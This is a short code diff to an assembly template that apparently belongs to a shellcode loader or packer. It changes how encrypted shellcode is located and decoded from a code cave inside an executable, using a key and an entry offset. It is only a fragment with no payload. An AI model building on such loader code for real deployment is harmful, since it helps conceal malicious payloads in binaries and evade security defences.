@@ -193,7 +193,7 @@ call {{.RegN.r14}}
 add rsp, 0x20
 add rsp, 0x08 // restore stack
 
-// read shellcode from section or instructions
+// read shellcode from section or code cave self
 {{if .SectionMode}}
   mov rsi, {{.RegN.rdi}}
   add rsi, {{hex .SectionOffset}}
@@ -203,7 +203,10 @@ add rsp, 0x08 // restore stack
   cld
   rep movsb
 {{else}}
-  {{db .CodeCaveStub}}
+  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
+  mov {{.RegN.rdi}}, [rsp]
+  add {{.RegN.rdi}}, {{hex .EntryOffset}}
+  {{STUB CodeCaveMode STUB}}
 {{end}}
 
 // get the shellcode entry point
